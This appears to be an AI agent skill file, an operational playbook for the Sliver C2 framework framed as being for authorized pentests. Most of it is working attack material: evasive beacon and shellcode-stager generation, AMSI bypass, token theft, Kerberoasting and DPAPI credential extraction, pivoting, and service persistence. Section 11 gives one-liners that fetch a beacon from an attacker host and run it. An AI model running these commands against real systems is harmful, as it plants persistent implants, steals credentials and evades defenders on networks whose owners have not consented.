---
name: sliver-c2
description: Sliver C2 framework — server/client setup, implant generation (session & beacon), listener management (mTLS/HTTP/HTTPS/DNS/WireGuard), post-exploitation, armory extensions, OPSEC defaults, and pivot/port-forward chaining for authorized internal pentests
metadata:
  type: offensive
  phase: post-exploitation
  tools: sliver-server, sliver-client, execute-assembly, armory, BOF
  mitre: TA0011
  reference:
    - https://sliver.sh/docs/?name=Getting+Started
    - https://www.notion.so/Sliver-Basics-Windows-Implants-2b77ade669ff809cb4eff49a06efb5b2
---

# Sliver C2

## When to Activate

- You need a persistent C2 channel into a compromised host
- Transitioning from initial access (nxc/evil-winrm/psexec foothold) to a full C2 implant
- Running post-exploitation that requires in-memory .NET assembly execution, BOF, or process injection
- Setting up pivots through a compromised host to reach an internal subnet
- Any scenario where "interactive shell" is insufficient and you need a proper C2 beacon

---

## Architecture Overview

```
┌─────────────────────────────────────────────────────────────────┐
│  Operator workstation                                           │
│   sliver-client ──── mTLS/gRPC ──── sliver-server              │
│                                          │                      │
│                                     Listeners                   │
│                              mTLS / HTTP(S) / DNS / WG          │
│                                          │                      │
│                                       Implants                  │
│                              Session (interactive)              │
│                              Beacon  (sleep/callback)           │
└─────────────────────────────────────────────────────────────────┘
```

**Implant types:**
| Type | Behaviour | OPSEC |
|------|-----------|-------|
| Session | Persistent interactive connection | Noisier — long-lived TCP connection |
| Beacon | Sleeps, calls back on interval, queues tasks | Preferred — mimics normal traffic, harder to detect |

---

## 1 — Server Setup

### Install (Kali / Debian)

```bash
curl https://sliver.sh/install | sudo bash
# Installs: /usr/local/bin/sliver-server  /usr/local/bin/sliver-client
```

### Start server

```bash
# Interactive (foreground)
sudo sliver-server

# Daemon mode (recommended for engagements)
sudo sliver-server daemon
```

### Connect as operator (same host)

```bash
sliver-client
# Defaults to ~/.sliver/configs/default.cfg if present
```

---

## 2 — Multiplayer Mode (team engagements)

```
# On server — create an operator profile
[server] sliver > multiplayer
[server] sliver > new-operator --name jesse --lhost <server-ip>
# Saves jesse_<server-ip>.cfg — send to teammate

# Teammate imports and connects
sliver-client import jesse_<server-ip>.cfg
sliver-client
```

---

## 3 — Listeners (C2 channels)

Start at least one listener before generating implants — implant callbacks are hardcoded at compile time.

### mTLS (preferred for internal ops — encrypted, low detection surface)

```
[server] sliver > mtls
# Default port: 8888
# Custom port:
[server] sliver > mtls --lport 443
```

### HTTPS (blends with web traffic)

```
[server] sliver > https --lport 443
# With Let's Encrypt (domain must resolve to your server):
[server] sliver > https --domain <your-domain> --lport 443 --lets-encrypt
# Self-signed (default when no --domain):
[server] sliver > https --lport 8443
```

### HTTP (no TLS — use only on isolated lab networks)

```
[server] sliver > http --lport 80
```

### DNS (covert / egress-restricted environments)

```
# Requires NS record pointing to your server for the domain
[server] sliver > dns --domains <c2.yourdomain.com>
```

### WireGuard (pivoting through WG mesh)

```
[server] sliver > wg
```

### Manage listeners

```
[server] sliver > jobs          # list active listeners
[server] sliver > jobs -k <id>  # kill a listener
```

---

## 4 — Implant Generation

### Session implant (Windows EXE, mTLS)

```
[server] sliver > generate \
    --mtls <lhost>:<lport> \
    --os windows \
    --arch amd64 \
    --format exe \
    --name IMPLANT_NAME \
    --save /tmp/implant.exe
```

### Beacon implant (preferred OPSEC)

```
[server] sliver > generate beacon \
    --mtls <lhost>:<lport> \
    --os windows \
    --arch amd64 \
    --format exe \
    --seconds 30 \
    --jitter 15 \
    --name BEACON_NAME \
    --save /tmp/beacon.exe
```

### HTTPS beacon (blends with web traffic)

```
[server] sliver > generate beacon \
    --https <lhost>:<lport> \
    --os windows \
    --arch amd64 \
    --format exe \
    --seconds 60 \
    --jitter 20 \
    --evasion \
    --name HTTPS_BEACON \
    --save /tmp/https_beacon.exe
```

### Format options

| `--format` | Output type | Use case |
|-----------|-------------|----------|
| `exe` | Standalone EXE | Default Windows delivery |
| `dll` | DLL | Reflective injection, side-loading |
| `shellcode` | Raw PIC shellcode | Inject via loader / stager |
| `service` | Windows Service EXE | `sc create` / psexec delivery |
| `shared` | Shared library (.so) | Linux |

### Key generation flags

| Flag | Effect |
|------|--------|
| `--evasion` | Enable symbol obfuscation (garble) — slower compile, better evasion |
| `--skip-symbols` | Skip symbol table stripping — fast compile, worse evasion |
| `--seconds N` | Beacon sleep interval |
| `--jitter N` | Random jitter ± N seconds on sleep |
| `--reconnect N` | Reconnect interval if connection drops |
| `--max-errors N` | Kill implant after N consecutive connection errors |
| `--os` | `windows` / `linux` / `mac` |
| `--arch` | `amd64` / `386` / `arm64` |
| `--canary <domain>` | Embed a canary domain (tripwire detection) |
| `--debug` | Enable verbose implant logging |

### Profiles (reuse generation config)

```
# Save a profile
[server] sliver > profiles new \
    --mtls <lhost> \
    --os windows \
    --format exe \
    --name win-mtls-profile

# Generate from profile
[server] sliver > profiles generate win-mtls-profile --save /tmp/

# List profiles
[server] sliver > profiles
```

### Shellcode stager

```
# Generate shellcode implant
[server] sliver > generate \
    --mtls <lhost> \
    --os windows \
    --arch amd64 \
    --format shellcode \
    --save /tmp/implant.bin

# Generate a stager that fetches and injects the shellcode
[server] sliver > generate stager \
    --lhost <lhost> \
    --lport 8443 \
    --protocol https \
    --format c
```

---

## 5 — Session & Beacon Management

### Sessions

```
[server] sliver > sessions                  # list active sessions
[server] sliver > use <session-id>          # interact (tab-completes)
[session] sliver (NAME) > background        # return to main menu
[server] sliver > sessions -k <session-id>  # kill session
[server] sliver > sessions -K              # kill ALL sessions
```

### Beacons

```
[server] sliver > beacons                   # list active beacons
[server] sliver > use <beacon-id>           # enter beacon context (commands queue)
[beacon]  sliver (NAME) > tasks             # list queued / completed tasks
[beacon]  sliver (NAME) > tasks --filter <task-id>  # inspect specific task output
[server] sliver > beacons -k <beacon-id>   # kill beacon
```

> **Note on beacons:** Commands entered in beacon context are *queued* and execute on the next callback. Results appear in `tasks`. Use `--timeout` on time-sensitive commands.

---

## 6 — Core Post-Exploitation Commands

All commands work in both session and beacon contexts unless noted.

### Host info & user context

```bash
info          # implant metadata (PID, OS, arch, uid, hostname)
whoami        # current user + groups
getuid        # effective UID
getgid        # effective GID (Linux)
getpid        # current PID
env           # environment variables
```

### File system

```bash
ls [path]           # list directory
cd <path>           # change directory
pwd                 # print working directory
cat <file>          # read file
download <remote> [local]   # download file from target
upload <local> <remote>     # upload file to target
mkdir <path>
rm <path>
```

### Process management

```bash
ps                  # list all processes (shows PID, name, owner, arch)
getpid              # current implant PID
migrate <pid>       # migrate implant into another process (OPSEC: migrate into stable long-lived proc)
```

### Execution

```bash
# Run a binary — no new window, output captured (OPSEC preferred over shell)
execute -o <command> [args]

# Interactive shell — OPSEC WARNING: spawns cmd.exe/bash subprocess
shell

# Run .NET assembly in-memory (no disk write)
execute-assembly <assembly.exe> [args]

# Load and execute a shared library in-process
sideload <library.so|dll> [entrypoint] [args]

# Spawn a DLL and call an export
spawndll <library.dll> [args]

# Inject raw shellcode into a PID
execute-shellcode --pid <pid> <shellcode.bin>
```

### Network

```bash
netstat             # active connections
ifconfig            # network interfaces
```

### Screenshot / clipboard

```bash
screenshot          # capture desktop screenshot (saved as loot)
```

### Registry (Windows)

```bash
registry read   --hive HKCU --path "Software\..." --key <key>
registry write  --hive HKCU --path "Software\..." --key <key> --value <val> --type string
registry create --hive HKCU --path "Software\..."
registry delete --hive HKCU --path "Software\..." --key <key>
```

### Loot management

```bash
loot              # list all loot collected
loot --filter <name>
# Many commands auto-add to loot (screenshot, hashdump, etc.)
```

---

## 7 — Privilege Operations (Windows)

```bash
# Token impersonation
impersonate <username>    # impersonate a logged-on user's token
steal-token <pid>         # steal token from a running process
make-token <user> <domain> <password>   # create token from creds
rev2self                  # drop impersonation, revert to original token

# Attempt local privilege escalation (wraps common exploits)
getsystem

# Check current privileges
getprivs
```

---

## 8 — Armory (Extensions & BOFs)

Armory is Sliver's package manager for community-contributed extensions (.NET assemblies, BOFs, aliases).

```
# List available packages
[server] sliver > armory

# Install everything (recommended at start of engagement)
[server] sliver > armory install all

# Install specific package
[server] sliver > armory install sharp-hound
[server] sliver > armory install rubeus
[server] sliver > armory install seatbelt
[server] sliver > armory install sharp-up
[server] sliver > armory install sharp-dpapi
[server] sliver > armory install sa-amsibypass
```

### Key armory packages

| Package | Purpose |
|---------|---------|
| `sharp-hound` | SharpHound BloodHound collector — `sharp-hound -c All` |
| `rubeus` | Kerberos attacks — AS-REP, Kerberoast, ticket ops |
| `seatbelt` | Host-based security audit |
| `sharp-up` | Local privilege escalation checks |
| `sharp-dpapi` | DPAPI credential extraction |
| `sa-amsibypass` | AMSI bypass before running .NET tools |
| `bof-collection` | Various Beacon Object Files (whoami, dir, etc.) |

### Running armory tools

```bash
# AMSI bypass first (before any .NET execution that might get caught)
[session] sliver > sa-amsibypass

# BloodHound collection
[session] sliver > sharp-hound -- -c All --zippassword infected

# Kerberoast
[session] sliver > rubeus -- kerberoast /outfile:hashes.txt /nowrap

# AS-REP roast
[session] sliver > rubeus -- asreproast /outfile:asrep.txt /nowrap

# Seatbelt full run
[session] sliver > seatbelt -- -group=all

# DPAPI vault extraction
[session] sliver > sharp-dpapi -- credentials

# Sharp-Up privesc checks
[session] sliver > sharp-up
```

### BOF execution

```bash
# Execute a compiled BOF directly
[session] sliver > bof <file.o> [args]
```

---

## 9 — Pivoting & Lateral Movement

### SOCKS5 proxy (route Impacket/nxc through implant)

```bash
# Start SOCKS5 listener on attacker (binds to 127.0.0.1:1080 by default)
[session] sliver > socks5 start --host 127.0.0.1 --port 1080

# Verify
[server] sliver > socks5

# Configure proxychains4.conf:
# socks5  127.0.0.1  1080

# Then on attacker:
proxychains4 nxc smb <internal-target>
proxychains4 evil-winrm -i <internal-target> -u <user> -p '<pass>'
proxychains4 impacket-secretsdump <domain>/<user>:<pass>@<dc>
```

### Port forwarding

```bash
# Forward local port to remote host:port through the implant
[session] sliver > portfwd add --remote <remote-host>:<remote-port> --bind 127.0.0.1:<local-port>

# Example: expose internal RDP
[session] sliver > portfwd add --remote 10.10.10.20:3389 --bind 127.0.0.1:13389
# Then: xfreerdp /v:127.0.0.1:13389 /u:<user>

# List forwards
[session] sliver > portfwd

# Remove
[session] sliver > portfwd rm --id <id>
```

### Reverse port forward (target pulls, attacker serves)

```bash
[session] sliver > rportfwd add --remote 0.0.0.0:<remote-port> --bind 127.0.0.1:<local-port>
```

### Named-pipe pivots (lateral movement within implanted host)

```bash
# On the pivot implant (already compromised host with no direct internet)
[session] sliver > pivots tcp       # starts a TCP pivot listener on the implant

# Generate a new implant that calls back via the pivot
[server] sliver > generate \
    --tcp-pivot <pivot-host>:<port> \
    --os windows \
    --format exe \
    --save /tmp/pivot_implant.exe
```

---

## 10 — OPSEC Defaults

| Practice | Rationale |
|----------|-----------|
| Beacons over sessions | Long-lived persistent TCP connections appear in netstat; beacons sleep and blend with normal traffic |
| `--evasion` flag | garble obfuscates symbol names, string constants — harder for static AV to match |
| `execute -o` over `shell` | `shell` spawns `cmd.exe` or `/bin/sh` as a child process — visible in EDR process trees; `execute -o` runs inline |
| `migrate` into a stable process | Running inside `explorer.exe`, `svchost.exe`, or a long-lived business app avoids implant death when parent terminates |
| AMSI bypass before .NET | `sa-amsibypass` or equivalent before `execute-assembly` / armory tools — prevents AMSI from scanning in-memory assemblies |
| mTLS for internal ops | mTLS is fully encrypted mutual-auth; harder to MitM or proxy-log than HTTP C2 |
| DNS/HTTPS for egress-restricted | DNS C2 is extremely slow but survives restrictive egress; HTTPS blends with web traffic |
| Avoid `hashdump` cold | Requires SYSTEM; triggers EDR. Use DPAPI / Rubeus / secretsdump from outside instead |
| Short sleep on first check-in, increase after | Start at 5–10s to confirm callback, then widen to 60–300s + high jitter to reduce beacon regularity |
| Canary domains | Embed `--canary <monitor-domain>` to detect if defenders detonate the implant in a sandbox |

---

## 11 — Delivery Patterns

### WinRM foothold → drop Sliver beacon

```bash
# On attacker: start HTTP server to serve the binary
python3 -m http.server 8888

# From nxc / evil-winrm session on target:
nxc winrm <target> -u <user> -p '<pass>' -x \
  "powershell -c \"Invoke-WebRequest -Uri 'http://<attacker>:8888/beacon.exe' -OutFile 'C:\Users\Public\svc.exe'; Start-Process 'C:\Users\Public\svc.exe'\""
```

### psexec delivery (requires SMB admin)

```bash
nxc smb <target> -u <user> -p '<pass>' --local-auth -x \
  "certutil -urlcache -split -f http://<attacker>:8888/beacon.exe C:\Windows\Temp\beacon.exe && C:\Windows\Temp\beacon.exe"
```

### LOLBIN delivery (certutil / bitsadmin)

```powershell
# certutil
certutil -urlcache -split -f http://<attacker>/beacon.exe beacon.exe

# bitsadmin
bitsadmin /transfer job /download /priority high http://<attacker>/beacon.exe C:\Windows\Temp\b.exe
```

### Service-format implant (persistence via sc)

```bash
# Generate service implant
[server] sliver > generate beacon \
    --mtls <lhost> \
    --format service \
    --name SVC_IMPLANT \
    --save /tmp/svc_implant.exe

# Install on target (requires SYSTEM or admin)
sc \\<target> create SlvSvc binPath= "C:\Windows\Temp\svc.exe" start= auto
sc \\<target> start SlvSvc
```

---

## 12 — Common Engagement Workflow

```
1. Start sliver-server on Kali (tun0 / lab VPN interface)
2. Start mTLS listener:       mtls --lport 8888
3. Generate beacon:            generate beacon --mtls <kali-ip>:8888 --os windows --format exe --evasion --seconds 30 --jitter 10
4. Deliver via existing access (WinRM, psexec, webshell)
5. Confirm beacon check-in:   beacons
6. Enter beacon context:       use <id>
7. AMSI bypass:                sa-amsibypass  (if running .NET tools)
8. Run SharpHound:             sharp-hound -- -c All
9. Download BloodHound zip:    download <zip>
10. Run Rubeus / Seatbelt as needed
11. Setup SOCKS5 if pivoting:  socks5 start --port 1080
12. Background beacon:         background
13. Continue with proxychains for AD attacks from Kali
```

---

## 13 — Troubleshooting

| Symptom | Likely Cause | Fix |
|---------|--------------|-----|
| Beacon doesn't call back | Wrong lhost/lport at compile time | Regenerate with correct IP; confirm listener is up with `jobs` |
| `execute-assembly` crashes | AMSI / ETW active | Run `sa-amsibypass` first |
| Beacon dies immediately | AV detected on disk | Use `--evasion`, switch to shellcode format + external loader |
| mTLS cert error | System clock skew | Sync time on attacker (`ntpdate`) |
| SOCKS5 not routing | proxychains not configured | Check `/etc/proxychains4.conf` — must match port |
| Armory install fails | No internet from server | Use `--bundle` flag or manually place extension files |

---

## 14 — Quick Reference Cheat Sheet

```
# Server
sliver-server / sliver-server daemon

# Listeners
mtls [--lport PORT]
https [--domain D] [--lport PORT] [--lets-encrypt]
http [--lport PORT]
dns --domains <domain>
jobs / jobs -k <id>

# Generate
generate [beacon] --mtls/--https/--http/--dns <LHOST>[:<PORT>]
  --os windows|linux|mac  --arch amd64|386|arm64
  --format exe|dll|shellcode|service|shared
  [--evasion] [--seconds N] [--jitter N] [--name NAME] [--save PATH]

# Interact
sessions / beacons
use <id>
background
tasks

# Core
info | whoami | ps | ls | cat | download | upload
execute -o <cmd> | shell
execute-assembly <asm.exe> [args]
migrate <pid>
socks5 start --port 1080
portfwd add --remote HOST:PORT --bind 127.0.0.1:PORT

# Armory
armory install all
sa-amsibypass | sharp-hound | rubeus | seatbelt | sharp-up | sharp-dpapi

# Token ops
steal-token <pid> | impersonate <user> | make-token | rev2self
```
